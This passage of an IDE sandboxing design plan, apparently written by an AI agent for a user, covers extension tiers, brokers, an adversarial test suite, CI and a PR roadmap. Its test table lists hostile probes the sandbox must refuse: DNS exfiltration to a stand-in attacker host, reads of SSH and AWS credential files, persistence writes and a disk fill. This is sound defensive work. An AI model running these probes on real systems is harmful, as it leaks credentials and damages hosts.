| Network | Proxy. The first connection to each new host prompts once per extension ("ESLint wants registry.npmjs.org"). The marketplace's known-hosts list pre-fills common ones (**guess:** we can derive a starter list from the 200 most-installed Open VSX extensions) |
| Exec | Allowed **inside** the sandbox (language servers, linters need it); children inherit the policy |
| Loopback | Own listeners only (language servers bind loopback); no connecting to other ports |
| Env | Built from nothing + PATH + locale + the bootstrap set (§3.6) |

**What breaks**, documented, with the fix each one gets:
- Extensions reading `~/.gitconfig`, `~/.npmrc` or `~/.docker/config.json`. Credentials stay denied; non-secret config is read through a `volt.config.read` broker for known files.
- Remote/SSH extensions. Not supported in T3; they need user-marked "Run unsandboxed".
- Debuggers attaching to arbitrary pids. Same.
- Extensions spawning GUI apps. Seatbelt denies them by default; they need the `process.gui` capability (new, high risk).
- Extensions that scan the home folder (some "project manager" extensions). They lose that and get a picker grant.
- **Telemetry:** we record T3 extension id + denied dimension (no paths) to learn the top breakages before the default flips (PR 26).

### 9.2 Volt-native third-party (T2)

- SES Compartments in an OS-sandboxed host (FS none, net via proxy, exec none).
- Endowments are the `volt.*` API as capability objects.
- UI goes in webviews through `voltPanels`.
- **The Android SDK Runtime lesson:**
  - ship T2 with a starter template, `volt plugin new`, and a Playground "New plugin" flow that writes a working plugin, so building for it is *easier* than a VS Code extension;
  - if, after two releases, fewer than ~10 registry plugins use T2, stop investing and make T3-with-manifest the recommended path.

### 9.3 MCP servers

- stdio servers configured in Volt (Agent Resources) launch through `IVoltSandboxService.start` with principal `mcp:<id>`.
- Default policy: workspace read, network proxy with prompt-on-new-host, no exec outside the sandbox.
- Servers launched *by* agent CLIs inherit the CLI's sandbox (already the case on sbx, since the CLI is the parent).
- HTTP MCP servers are network destinations. They need an allowlist entry like any host.

### 9.4 Agent CLIs

Already done on sbx (`2a74a49398f`, `f704e61c1f9`). Remaining:
- the live "Allow host" (PR 2);
- per-provider default policies moved into provider manifests (`policyHints`, narrow-only) in wave B;
- Windows via MXC (PR 9).

### 9.5 Marketplace review

- The Volt registry (a thin index over Open VSX plus Volt signatures) runs automated review on submit:
  - manifest lint;
  - capability risk score;
  - a static scan for `child_process`, native `.node` files, obfuscation and minified-only bundles;
  - a dynamic run in the Docker rig under audit mode that records the hosts and paths it touches against what it declares.
- `critical` capabilities need a human review.
- Open VSX extensions without a Volt listing still install (T3 default policy); they just show "Not reviewed by Volt".

---

## 10. Brokers instead of raw access

| Broker | API | Why a broker | Notes |
|---|---|---|---|
| Files | `volt.files.pick({ kind, multiple }) → VoltFileHandle[]`; `handle.read()/write()/watch()` | OS FS policy can't widen live (§3.2) | Handles persist per principal if the user ticks "Remember"; stored server-side |
| Secrets | `volt.secrets.get/set/delete(key)` namespaced to the principal | Keychain/libsecret/DPAPI need IPC that the sandbox denies (Seatbelt mach-lookup, no D-Bus in bwrap) | Same as VS Code `SecretStorage`, but enforced: the host has no keychain route |
| Terminals | `volt.terminals.run({ command, cwd }) → handle` | The command runs through SandboxManager with the *caller's* policy ∩ the terminal policy | `terminals.run` capability; output streamed |
| Exec (T1 only) | `volt.exec(spec)` | First-party processes (gh, git) are spawned by core under a policy | T2 never; T3 has in-sandbox exec instead |
| Git | `volt.git.status/log/diff/commit` | Protected paths (hooks, config) stay core-owned | `git.remote` capability for push/fetch → through the proxy |
| Clipboard | `volt.clipboard.write` free; `read` needs a user gesture in the last 1 s + `clipboard.read` | Clipboard often holds secrets | |
| UI | Webviews only, `postMessage` only, CSP from Volt | No DOM access to the workbench (customize.md §6.3) | Crash = "Panel stopped · Reload" |
| Network | The proxy, with per-principal identity | Hostname rules need a broker (Android: no OS-level hostname allowlist) | §5 |

---

## 11. Verification

### 11.1 Adversarial suite per OS

sbx already has `sandboxSecurity.test.ts`, required in CI with `VOLT_SANDBOX_REQUIRED=1`, so a missing backend *fails* (`sbx:.github/workflows/volt-ci.yml` sandbox job). It gets extended per PR with these scenarios, each a test case that must be *refused or contained* and checked against host state:

| Scenario (source) | Test |
|---|---|
| Forge RPC to the control daemon (DSec) | From inside the sandbox, connect to the Host MCP port/socket with no token, a forged HMAC and a replayed token; and to the volt-server port with `Host: localhost` spoofed. All must be refused |
| Loopback control API (DeepSeek CVE-2026-82533) | Start a fake unauthenticated server on 127.0.0.1:3080 on the host; the sandbox must not reach it |
| Overwrite `/bin/bash` / system binaries (DSec) | Write to `/bin`, `/usr`, `/Applications`, `C:\Windows`: denied |
| Recursive grep through `/proc` (DSec) | `grep -r / ` with a 30 s cap; the host stays responsive; `/proc/<host pid>` not visible (pid ns) |
| `yes > file` disk fill (DSec) | Write cap (`RLIMIT_FSIZE`) + tmp quota; the run is killed and the host disk delta is < cap |
| Port scan (DSec) | Connect to 1000 ports on RFC1918 and loopback: all refused, one coalesced denial |
| Hunt for leftovers (DSec) | Read other worktrees, other chats' tmp, `~/.volt/permissions`: denied |
| `run_code` outside the sandbox (DeepSeek, 2nd hole) | Static test: every `child_process`, `utilityProcess`, `Worker` and `vm` call site in voltRuntime/voltAgent/server is in an allowlist (a script, `scripts/volt-sandbox-spawn-audit.mjs`, fails CI on new unlisted spawns) |
| setsid double fork survivor (brief gap) | After terminate, no process with the run tag or the run's cwd exists |
| Ext host env leak | Inside a T3 host: `process.env` keys == the §3.6 set |
| Credential read | `~/.ssh/id_ed25519` sentinel, `~/.aws/credentials`, `.env.local`: denied on every OS |
| Persistence | Write `~/.zshrc`, `~/Library/LaunchAgents`, `~/.config/systemd/user`, `HKCU\…\Run`: denied |
| SNI mismatch | CONNECT allowed.com + SNI evil.com: refused |
| DNS exfil | `nslookup <data>.attacker.com` inside: no resolver; the mach DNS service is denied on macOS |
| Android order lesson | Fault-inject every launch step (seccomp load, bind, setenv, confirm); the child must be dead and status `failed`, never `initialized` |

### 11.2 Fuzzing

- `parseSandboxPolicy`, `parseSandboxPolicyLayer`, `compilePolicy` and the capability manifest parser get property tests (fast-check, **guess:** add as a devDependency) in the normal unit suite (1k runs).
- A nightly job runs 1M runs.
- Properties checked:
  - the parser never throws;
  - output ⊆ allowed keys;
  - narrow-only layers never widen (∀ base, layer: `compose(base, untrusted(layer)) ⊆ base`);
  - credential paths are always denied whatever the input.
- Seatbelt profile and bwrap argv generators get **snapshot + differential** tests: the same resolved policy maps to equivalent allow-sets on both.

### 11.3 Enforcement telemetry and attestation

- Event `voltSandbox/launch`:
  - `principalKind` (agent/ext/mcp/run);
  - `backend`;
  - `status`;
  - `unenforced[]`;
  - `osBuildBucket`;
  - `result` (`confirmed | refused | userOverride | canaryFailed`);
  - `tier`.
- Event `voltSandbox/denials`: counts per dimension per session, with no hosts or paths except for first-party principals in audit mode, where hostnames help fix manifests.
- Both respect `telemetry.telemetryLevel`.
- **Local attestation:** Settings → Security shows per running principal what *was confirmed* (the confirm detail string: namespace inodes, `Seccomp:2`, the Seatbelt marker, the MXC container id). That is the user-visible equivalent of Play Integrity: enforcement observed, not configured.
- **Release gate:** beta → stable promotion of any sandbox-touching PR requires:
  - refusal rate < 2%;
  - canary failures = 0 across beta telemetry for 7 days (**guess:** thresholds to tune).

### 11.4 CI matrix

| Job | ubuntu-24.04 x64 | ubuntu-24.04-arm | Docker rig (on ubuntu) | macos-15 arm64 | macos-14 (x64 or arm) | windows-2025 hosted | Win11 25H2 self-hosted | When |
|---|---|---|---|---|---|---|---|---|
| Policy/composition/capability unit (`common/`) | ✅ | | | ✅ | | ✅ | | every PR (src) |
| Adversarial suite `sandboxSecurity.test.ts` (`VOLT_SANDBOX_REQUIRED=1`) | ✅ (exists) | ✅ | ✅ Debian 12, Fedora 41 SELinux, Ubuntu 22.04, Arch | ✅ (exists) | ✅ | refuse-path only | ✅ (PR 9+) | every PR (src) |
| Seccomp syscall numbers vs headers | ✅ (exists) | ✅ | ✅ | | | | | every PR |
| Spawn audit (`volt-sandbox-spawn-audit.mjs`) | ✅ | | | | | | | every PR |
| Long-lived host boot + env exactness | ✅ | | ✅ | ✅ | | | ✅ | every PR (PR 18+) |
| Extension host integration (T3 real extensions: ESLint, Prettier, GitLens, Python LS) | ✅ | | | ✅ | | | ✅ | nightly + release |
| T2 SES host escape suite | ✅ | | | ✅ | | ✅ | | every PR (PR 21+) |
| Fuzz 1M | ✅ | | | | | | | nightly |
| Perf bench (`scripts/volt-sandbox-bench.mjs`): launch latency, host RSS | ✅ | | | ✅ | | | ✅ | nightly, regress > 20% fails |
| Signature/revocation tests | ✅ | | | ✅ | | ✅ | | every PR (PR 23+) |
| Reproducible extensions rebuild | ✅ | | | | | | | nightly |
| Live e2e (built app, CDP, fresh profile: agent turn sandboxed, Allow host live, ext install sheet) | ✅ (xvfb) | | | ✅ | | | ✅ | release candidate |

Notes:
- main's `volt-ci.yml` is Linux-only today, apart from the sbx sandbox job's `macos-15`. Adding Windows to the required `check` gate needs the self-hosted runner to be reliable. Until then the Win11 job is **required on release branches and advisory on PRs**.
- The self-hosted runner must be ephemeral (fresh VM per job), because the adversarial suite deliberately tries to persist.
- macOS runners cost ~10× Linux minutes (**guess:** check GitHub's pricing). Keep the macOS adversarial job path-filtered to `src/vs/platform/voltSandbox/**`, voltStdio, the extension host and voltRuntime spawn sites.

---

## 12. Phased roadmap: the PR sequence

Each PR merges to `main` and ships in the next beta. Three flags hold it together:
- `volt.sandbox.mode`: `off | audit | enforce`, per tier;
- `volt.extensions.sandboxedHosts`: `off | firstParty | all`;
- `product.json` `voltSandbox.minimumMode`: a floor the app enforces.

**Kill-switch rule:** a remote/feed-delivered switch may only move a tier from `enforce` to `ask`, where every launch prompts "Sandbox disabled by Volt for <reason> · Run outside sandbox / Don't run". It never moves silently to `off`. A switch that can silently disable the sandbox is itself an attacker target (A2).

### Phase 0: land and harden the core (agents are protected)

**PR 1: Merge `feat/volt-sandbox`** (ask the user first, brief §2)
- **Scope:**
  - Rebase the 10 commits onto main. Conflicts are likely in `voltRuntime/browser/agents/acpProvider.ts`, `hostToolService.ts` and `agentEditor.ts`; main moved 11 commits, including #90 and customize.
  - No behavior change beyond what the branch already does.
- **Files:** 76 files / +11,155 −1,007 per `git diff --stat main...feat/volt-sandbox`: `src/vs/platform/voltSandbox/**`, `voltStdio`, `voltRuntime` access/host tools, `docs/security/sandbox/00-05`, `scripts/volt-sandbox-*`, `.github/workflows/volt-ci.yml` (the sandbox job + `check` gate).
- **Tests:**
  - unit: sandboxCore/Policy/Inheritance/seccomp/bwrap;
  - adversarial: `sandboxSecurity.test.ts` on ubuntu-24.04 + macos-15;
  - live: on a fresh profile, a Grok 4.7 turn in a sandboxed chat (memory: *Test with Grok 4.7*) runs `cat ~/.ssh/id_ed25519` (refused) and `curl example.com` (denied → denial row).
- **CI:** existing + the sandbox job.
- **Acceptance:**
  - all CI green;
  - `compile-check-ts-native` clean;
  - Windows shows the refuse dialog with "Run outside sandbox";
  - a chat set to "off" behaves exactly as main does today.
- **Effort:** 1 ew.
- **Users get:** opt-in sandboxed agents on macOS and Linux.

**PR 2: Live grants + "Allow host" fix**
- **Scope:**
  - Wire `allowSandboxDomains` (`sbx:voltStdioService.ts:219`) from the denial row through `IPreparedSandbox.allowDomains`.
  - Introduce `grantEpoch`; `sandboxLaunchKey` excludes network grants and includes relaunch-class changes only.
  - Persistent grants go to `~/.volt/permissions/agent-<provider>.json`.
- **Files:** `voltStdio/node/voltStdioService.ts`, `voltSandbox/node/sandboxManager.ts`, `voltRuntime/common/access/sandboxRefusal.ts`, the denial row in `voltAgent/browser/chrome/agentTimeline.ts`.
- **Tests:**
  - unit: a grant reaches a live proxy without restart;
  - adversarial: a granted host for chat A is not reachable from chat B (principal isolation);
  - live: deny → Allow → the same turn retries and succeeds, with no CLI restart (the pid is unchanged).
- **Acceptance:** the pid is stable across Allow; a denial row turns into "Allowed".
- **Effort:** 0.5 ew.
- **Users get:** Allow host works.

**PR 3: Policy files + admin layer**
- **Scope:**
  - Load `~/.volt/sandbox.json` (trusted) and `.volt/sandbox.json` (untrusted, narrow-only, trusted workspaces only).
  - Load `/etc/volt/sandbox.json` / MDM (narrow-only cap).
  - Add a JSON schema for editing.
- **Files:** new `voltSandbox/node/sandboxPolicyFiles.ts`, `sandboxComposition.ts`, a schema contribution in `voltCustomize`-style JSON validation.
- **Tests:**
  - unit + fuzz: narrow-only;
  - adversarial: a repo file trying `network.mode: host` is dropped and recorded.
- **Acceptance:** dropped widenings appear in Settings → Security.
- **Effort:** 0.5 ew.
- **Users get:** policy as code.

**PR 4: Close OS gaps**
- **Scope:**
  - macOS: explicit DNS mach-service deny; the `volt-sbx-init` reaper spike for the setsid survivor (ship it, or document if the spike fails).
  - Linux: memory limit through a cgroup v2 `systemd-run --user --scope -p MemoryMax=` when available, keeping RLIMIT_AS as the fallback, and probe-reported.
- **Files:** `voltSandbox/common/seatbelt.ts`, `node/seatbeltBackend.ts`, `node/bubblewrapBackend.ts`, new `node/cgroup.ts`.
- **Tests:** adversarial: setsid survivor, DNS lookup, a 4 GB allocation is killed at the cap.
- **Acceptance:** all three green, or explicitly listed in 05-limitations with probe status `partial`.
- **Effort:** 1.5 ew.
- **Users get:** tighter containment.

**PR 5: `IVoltSandboxService` + long-lived handle + status UI + telemetry**
- **Scope:**
  - §3.2 API wrapping SandboxManager.
  - The `start()` handle and the confirm canary.
  - Settings → Security page ("Sandbox activity" list).
  - `voltSandbox/launch` and `voltSandbox/denials` telemetry.
  - The `volt.sandbox.mode` setting and the kill-switch semantics.
- **Files:**
  - new `src/vs/platform/voltSandbox/node/sandboxService.ts`, `common/sandboxService.ts` (interface + IPC channel);
  - server registration in `src/vs/server/node/voltAgent/agentServerMain.ts`;
  - Settings page in `voltAgent/browser/settings/` (uses `createVoltButton`/`WorkbenchList`).
- **Tests:**
  - unit: status transitions;
  - live: the Security page lists a running agent with backend and confirm detail.
- **Acceptance:** every sandboxed process on the server is visible, with status and unenforced dimensions.
- **Effort:** 1.5 ew.
- **Users get:** sandbox visibility.

**PR 6: Spawn audit gate**
- **Scope:** `scripts/volt-sandbox-spawn-audit.mjs` lists every `child_process` / `utilityProcess` / `Worker` / `vm` call in Volt code, with an allowlist file giving each a reason. CI fails on unlisted new ones.
- **Files:** script + `build/volt/sandbox-spawn-allowlist.json` + a CI step.
- **Acceptance:** the current tree passes with every entry justified.
- **Effort:** 0.5 ew.
- **Users get:** nothing visible; this prevents DeepSeek's `run_code` class of hole.

### Phase 1: policy v2 and permissions (the contract plugins will build against)

**PR 7: Policy schema v2 + `compilePolicy`**
- **Scope:** §3.3 (`targetPolicy`, `principal`, `network.local`, `ipc.volt`, `audit`); v1 → v2 upgrade; `compilePolicy`.
- **Files:** `voltSandbox/common/sandboxSchema.ts`, new `common/sandboxCompile.ts`, `sandboxCapabilities.ts` (API capabilities added).
- **Tests:** fuzz properties (§11.2); round-trip of v1 files; snapshot of compiled policies for every built-in tier.
- **Acceptance:** all v1 policies produce byte-identical resolved output.
- **Effort:** 1 ew.

**PR 8: Permission service + grant store + install sheet (agents and MCP first)**
- **Scope:**
  - `IVoltPermissionService` (server-owned) with `request/grant/revoke/list`, keyed by principal.
  - Prompt coalescing (§8.3).
  - The install/consent sheet component (reused later for extensions).
  - Launch Agent Resources MCP servers through `start()`.
- **Files:** new `src/vs/platform/voltPermissions/{common,node}`, the MCP launch site in voltRuntime, sheet UI in `voltAgent/browser/permissions/`.
- **Tests:**
  - unit: store, version-range re-prompt;
  - live: adding an MCP server shows its default policy; its first new host prompts once.
- **Acceptance:** an MCP server can't read `~/.ssh` (adversarial).
- **Effort:** 2 ew.
- **Users get:** sandboxed MCP servers with grants.

**PR 9: Windows MXC backend (`mxcBackend.ts`)**
- **Scope:**
  - Probe the OS build floor (brief §4).
  - Verify `wxc-exec.exe` with Authenticode.
  - Translate the resolved policy to MXC (FS ACL rules; network = allow only `127.0.0.1:<proxyPort>` by IP rule).
  - Confirm via the container id + the canary.
  - Terminate via a job object.
  - Bundle `wxc-exec.exe` in the win32 build.
- **Files:** new `voltSandbox/node/mxcBackend.ts`, `common/mxcPolicy.ts`; `sandboxBackend.ts` (`SandboxBackendId` gains `'mxc'`, `sbx:…/sandboxBackend.ts:14`); `createBackend` (`sbx:…/sandboxManager.ts:367`); `build/` win32 packaging; `.github/workflows/volt-build.yml` (Windows job, `:472`).
- **Tests:**
  - unit: policy translation;
  - adversarial on self-hosted Win11 25H2: the full suite including `HKCU\Run` and direct public-IP connect;
  - live: a Git Bash `ls` inside the sandbox must run, because of the srt PR #766 MSYS2 crash. **If it crashes, the PR ships with agents on Windows defaulting to PowerShell under MXC, and says so.**
- **CI:** a new `sandbox-windows` job on the self-hosted runner, advisory on PRs and required on release.
- **Acceptance:**
  - on supported builds: enforced FS + process, network via proxy only;
  - below the floor: refuse with the exact build needed.
- **Effort:** 3 ew. This is the most uncertain number in the plan.
- **Users get:** sandboxed agents on modern Windows 11.

### Phase 2: the API boundary and migration (Volt becomes plugins)

**PR 10: Volt extension API v0 + `volt.d.ts`**
- **Scope:**
  - `volt.tools.register` (an extension contributes host tools that appear in the volt MCP server);
  - `volt.agents.read/send`;
  - `volt.threads`;
  - `volt.storage`;
  - `volt.secrets` (namespaced);
  - `volt.providers.register` (§6.3);
  - `voltPanels` (customize.md §6.3) with the slots `rightPanel`, `sidebar.*`, `chat.aboveComposer`, settings pages.

  Every main-thread method calls `IVoltPermissionService.check(principal, capability)`.
- **Files:**
  - new `src/vs/workbench/api/common/extHostVolt*.ts`, `api/browser/mainThreadVolt*.ts`;
  - `src/vscode-dts/volt.d.ts` (shipped as `@volt/types`);
  - `extensionsApiProposals` entry so it's gated during v0.
- **Tests:**
  - unit per API with a capability-denied case each;
  - an integration test extension in `extensions/volt-api-tests` (pattern: `vscode-api-tests`).
- **Acceptance:** a sample extension registers a tool that an agent calls; without `tools.register` the registration is refused.
- **Effort:** 3 ew.
- **Users get:** extensions can extend Volt (docs say "preview").

**PR 11: Feature fence + lazy feature packages (T0p mechanics)**
- **Scope:**
  - Create `src/vs/workbench/contrib/volt/features/` and the facade `services/voltExtensionApi/common/`.
  - An import rule in `eslint.config.js` (`local/code-import-patterns`).
  - `IVoltFeatureService` lazy-loads `<id>.contribution.ts`.
  - Move **one** feature (usage) to prove the mechanics.
- **Files:** `voltCustomize/browser/voltFeatureService.ts`, `eslint.config.js`, the usage feature code.
- **Tests:**
  - unit: a disabled feature's module is never imported (a spy on the loader);
  - live: startup time is unchanged or better (CDP).
- **Acceptance:** the lint fails on a deliberate bad import.
- **Effort:** 1.5 ew.

**PR 12: Wave A: memory, playgrounds, commitReview, codeIntelligence → T1 extensions**
- One PR per feature: 12a–12d.
- **Scope:** the §6.2 steps 1-3, plus each manifest's `voltCapabilities`.
- **Files:**
  - `extensions/volt-memory/src/*`, `extensions/volt-playgrounds/src/*`, `extensions/volt-commit-review/src/*`, `extensions/volt-code-intelligence/src/*`;
  - delete the matching `voltRuntime` tool code;
  - `voltFeatures.ts` keeps the catalog (tools now come from the extension's registration).
- **Tests:**
  - unit: moved tests follow the code (`extensions/volt-*/src/test`);
  - live per feature: the parity checklist (e.g. memory: `memory_write` / `memory_read` across two chats).
- **CI:** `extensions` job (exists).
- **Acceptance:** parity, enable/disable live, no startup regression; the T1 host runs in `audit` mode and its denials are recorded.
- **Effort:** 1 ew each, plus 1.5 ew for codeIntelligence (its index child process).
- **Users get:** nothing visible (by design). Volt's first real code-bearing extensions.

**PR 13: First-party T1 host on volt-server (unsandboxed → audit)**

This PR needs to land before wave A's audit claims mean anything. Order: 13 then 12, or together.
- **Scope:**
  - A second extension host kind on the server, "Volt first-party", forked through `IVoltSandboxService.start` with the env from §3.6.
  - `audit: true` policy compiled from each T1 manifest.
  - The extension host kind picker routes `publisher === 'volt'` *and* a valid signature to it.
- **Files:**
  - `src/vs/server/node/extensionHostConnection.ts` (`:277`, the fork site → `start()`);
  - `src/vs/workbench/services/extensions/common/extensionHostKind.ts` (new kind);
  - `extensionRunningLocationTracker.ts`.
- **Tests:**
  - env exactness;
  - the host reconnects after `relaunch()`;
  - adversarial: under `enforce`, a first-party extension can't read `~/.ssh`.
- **Acceptance:** all Wave A extensions run in it under audit with zero breakage, and the Security page shows them.
- **Effort:** 3 ew. This is the hardest plumbing in the plan: ext-host IPC under a sandbox, with sockets in `ipc.volt`.

**PR 14: Wave B: providers ×12 + claudeAccounts**
- PRs 14a–14m. Claude, Codex and Cursor first, because the user runs them daily.
- **Scope:** the provider launch code moves to describe-only extensions (§6.3); core keeps the ACP plumbing and the SandboxManager launch.
- **Files:** `voltRuntime/browser/agents/acpProvider.ts` splits into core `acpLauncher` + `extensions/volt-provider-*/src/extension.ts`.
- **Tests:**
  - per provider live: sign-in state, model list, one turn (memory: *Claude ACP model aliases*);
  - adversarial: a provider extension calling `child_process` is denied under enforce.
- **Acceptance:** model picker parity; disabling a provider removes it live.
- **Effort:** 0.5 ew each × 12 + 1 ew claudeAccounts ≈ 7 ew.
- **Users get:** providers as plugins; third parties can add providers (API preview).

**PR 15: Wave C: usage, automations, gitGraph, pullRequests, agentResources, skills, remoteDevices**
- PRs 15a–15g.
- **Scope:** logic to T1, UI to webviews via `voltPanels`. Usage already passed through the fence in PR 11.
- **Tests:** per-feature live checklists; a visual parity screenshot per page (CDP).
- **Acceptance:** identical behavior; panels survive a crash with "Panel stopped · Reload".
- **Effort:** 1.5–3 ew each ≈ 14 ew. **This is the brief's biggest underestimate:** each page is a rewrite from workbench widgets to webview UI, and `@volt/ui` web components (customize.md §6.2) must exist first, or every page reinvents lists and buttons.
- **Users get:** the same features, now optional and replaceable through slots.

**PR 16: Wave D: fence-only for browser, scratch, visuals, devices, computerUse, customize**
- **Scope:** the §6.2 step 1 only. Native helpers (desktop, device and speech helpers) get explicit policies where the OS allows.
  - The speech helper and the computer-use helper are TCC-bound by path (memory: *Volt voice permissions*). Sandboxing them would break TCC attribution, so they stay unsandboxed and are listed in the spawn allowlist with a reason.
- **Effort:** 3 ew.
- **Users get:** disabling these really unloads them.

**PR 17: Turn T1 from audit to enforce**
- **Scope:** fix manifests from audit telemetry, then flip `volt.sandbox.mode.firstParty` to `enforce` in beta for one release, then stable.
- **Acceptance:** zero first-party denials in beta for 7 days.
- **Effort:** 1 ew.
- **Users get:** Volt's own plugins are contained too.

### Phase 3: third-party plugins run sandboxed

**PR 18: Sandboxed T3 hosts per publisher on volt-server**
- **Scope:**
  - `ExtensionHostKind.SandboxedRemote(group)`, one host per publisher (cap 8, then a shared untrusted pool);
  - the default T3 policy (§9.1);
  - first-new-host prompts via the permission service;
  - per-host proxy identity.
- **Files:** `extensionHostConnection.ts`, `extensionHostKind.ts`, `extensionRunningLocationTracker.ts`, new `voltSandbox/common/profiles/t3.ts`.
- **Tests:**
  - integration with ESLint, Prettier, Python LS and GitLens (nightly);
  - adversarial: a test extension tries the §11.1 list;
  - perf: host RSS per publisher (budget **guess:** < 80 MB idle).
- **Acceptance:** the 4 real extensions work under `enforce`; the test extension is contained.
- **Effort:** 3 ew.
- **Users get:** behind `volt.extensions.sandboxedHosts: all` (default `off`), sandboxed VS Code extensions on the server (web/phone first).

**PR 19: Desktop routes extensions to the local server's sandboxed hosts**
- **Scope:**
  - Desktop's local ext host keeps T0 helpers and user-marked "unsandboxed" extensions.
  - Everything else runs on the local volt-server's T3 hosts.
  - This is the decision I want from the user (§13 D2). The alternative is `cp.fork(ELECTRON_RUN_AS_NODE)` under sandbox-exec/bwrap straight from main, which is a second implementation.
- **Files:** `src/vs/workbench/services/extensions/electron-browser/localProcessExtensionHost.ts` (routing), extension kind picker.
- **Tests:** live: an extension's view works from desktop when its host lives on the server; the latency of `executeCommand` round trips (**guess:** +1–3 ms).
- **Acceptance:** extension parity on desktop with sandboxed hosts on.
- **Effort:** 2 ew.

**PR 20: Brokers: files, secrets, terminals, git, clipboard**
- **Scope:** the §10 APIs in `volt.*`, server-side handle store.
- **Files:** new `src/vs/platform/voltBrokers/{common,node}`, `extHostVolt*` additions.
- **Tests:** a handle from plugin A is unusable by plugin B (adversarial); a picker grant survives a restart only when remembered.
- **Effort:** 3 ew.

**PR 21: T2 SES plugin host**
- **Scope:**
  - A Node host running `ses` `lockdown()`, one Compartment per plugin;
  - endowments = the `volt.*` API objects;
  - OS policy: FS none (except the plugin's bundle, read-only), net proxy, exec none;
  - UI via `voltPanels` only;
  - `volt plugin new` template + Playground "New plugin".
- **Files:** new `src/vs/workbench/api/node/voltPluginHost/` (host main, compartment loader), `extensions/volt-plugin-template/`.
- **Tests:**
  - SES escape suite: prototype pollution across Compartments, `Function` constructor, `import()` of `fs`, `process.binding`, timing of shared globals;
  - adversarial: OS layer catches a hypothetical SES escape (a test that disables SES on purpose and checks the OS policy still contains the plugin).
- **Acceptance:** a template plugin runs, draws a panel and calls an allowed host; an escape test is contained by the OS layer.
- **Effort:** 4 ew.
- **Users get:** a safe-by-construction plugin type.

**PR 22: Permissions UX for extensions**
- **Scope:** the install sheet for any extension with `voltCapabilities`; per-extension Permissions page; revoke live / relaunch; prompt fatigue rules (§8.3).
- **Effort:** 2 ew.

**PR 23: Signing, verification at load, revocation feed**
- **Scope:**
  - `volt-sign` tooling (CI, OIDC → KMS);
  - the signed manifest in VSIX (`.volt-signature.json` with a hash per file);
  - verification at install and load;
  - publisher key pinning;
  - the revocation list in the static update feed;
  - extending `product.json` checksums to bundled `extensions/volt-*`.
- **Files:** `build/volt/sign/*`, `src/vs/platform/extensionManagement/node/voltSignature.ts`, `.github/workflows/volt-build.yml`, `volt-stable.yml`.
- **Tests:** a tampered file fails load; a different key on update is refused; a revoked id is disabled within one feed poll.
- **Acceptance:** all first-party extensions verify; a deliberately corrupted one doesn't load and shows why.
- **Effort:** 3 ew.

**PR 24: Volt registry + automated review**
- **Scope:** a static index over Open VSX + Volt countersign; the automated review pipeline (§9.5) running in the Docker rig.
- **Lives in:** `../volt-server` or a new repo (**guess:** the user decides).
- **Effort:** 4 ew.

**PR 25 (conditional): Windows legacy backend (srt-win style)**
- Only if Windows-10 telemetry shows demand. Self-hosted Win10 runner.
- **Effort:** 4 ew.

**PR 26: Default flip**
- **Scope:** `volt.extensions.sandboxedHosts: all` by default on macOS/Linux and Windows 11 supported builds. Unsupported Windows keeps `off` with a banner.
- **Gate:** two beta releases with < 2% "Run unsandboxed" overrides among the top 200 extensions.
- **Users get:** third-party plugins run sandboxed with permissions. **Done.**

### Effort roll-up (guesses)

| Phase | PRs | ew |
|---|---|---|
| 0 Core | 1–6 | 5.5 |
| 1 Policy v2 + permissions + Windows | 7–9 | 6 |
| 2 API + migration | 10–17 | ~33 |
| 3 Third-party sandboxed | 18–24, 26 | ~22 |
| Total (without PR 25) | | **~66 ew** |

Phase 2 is half the total. That's why I argue migration must not block Phase 0/1: those protect users from today's real threat in ~11 ew.

### Dependency graph (what can run in parallel)

```
1 → 2 → 5 → 8 → 18 → 19 → 26
1 → 3, 4, 6 (parallel)
5 → 7 → 8
5 → 9 (Windows, own track)
7 → 10 → 11 → {12, 13} → 14 → 15 → 17
11 → 16
10 + 20 → 21 → 22
10 → 23 → 24
```

---

## 13. Risks, open questions, decisions for the user

### Risks I think the brief underestimates
1. **UI-feature migration cost** (§6.1 waves C/D). Rewriting workbench UI as webviews is ~14 ew for wave C alone, and it depends on `@volt/ui` components existing first. *Mitigation:* T0p fence-only for deep UI. Don't promise "everything is an out-of-process plugin".
2. **Windows coverage.** The MXC floor excludes Windows 10 and most of Windows 11 before 24H2. The MSYS2 crash can break Git Bash agents even on supported builds. Hosted CI runners may not support MXC (**guess**).
3. **"Allow all" first-party signing turns the release key into a master key.** It also loses the audit data needed to ever tighten. *Mitigation:* §7, pre-approved declared capabilities in audit → enforce.
4. **Ext host under a sandbox is plumbing-heavy.** It means env allowlists, IPC sockets, `NODE_CHANNEL_FD`, crash/restart loops and the debugger port. PR 13 is the one most likely to slip.
5. **Live FS grants are impossible at the OS layer.** Any UX that promises "grant folder access now" without a relaunch needs the broker. Designers must know this before drawing permission sheets.
6. **Remote kill switches are an attack surface.** §12's rule: they can only move toward *ask*, never silently off.
7. **T2 adoption.** The Android SDK Runtime died of low adoption (brief §4). Budget the template, docs and Playground flow as part of PR 21, not later.
8. **Memory.** One Node host per publisher costs ~40–80 MB each (**guess**). With 20 extensions from 12 publishers that's ~0.5–1 GB. Hence the cap of 8 and the shared untrusted pool; measure in PR 18.

### Open questions
- Does MXC ProcessContainer work on Windows Server 2025 (`windows-2025` runners)? If yes, the Windows job can be hosted and required.
- Does Open VSX expose publisher signatures we can verify, or do we rely only on Volt's countersign?
- Can the computer-use and speech helpers run under any Seatbelt profile without losing TCC attribution?
- What is the oldest macOS and Linux distro Volt promises? This decides the macos-14 job and the Docker rig images.

### Decisions I want the user to make
- **D1.** Approve the reorder: harden the agent sandbox (Phase 0–1) *before and alongside* migration, instead of after it.
- **D2.** Desktop extensions: route to the local volt-server's sandboxed hosts (my recommendation, PR 19), or build a second sandboxed fork path in Electron main?
- **D3.** First-party trust: "pre-approved declared capabilities, audit → enforce" (my recommendation) versus literal allow-all.
- **D4.** Windows below the MXC floor: refuse + "Run outside sandbox" (my recommendation for v1) versus building srt-win style (PR 25, 4 ew + elevated installer).
- **D5.** T0p (fence-only, in-process) for browser, scratch, visuals, devices, computerUse and customize: accept that these never become out-of-process plugins?
- **D6.** A self-hosted ephemeral Windows 11 runner (cost and ownership) as a required release gate?
- **D7.** PR 1: merge `feat/volt-sandbox` to main now (brief §2 says ask first).
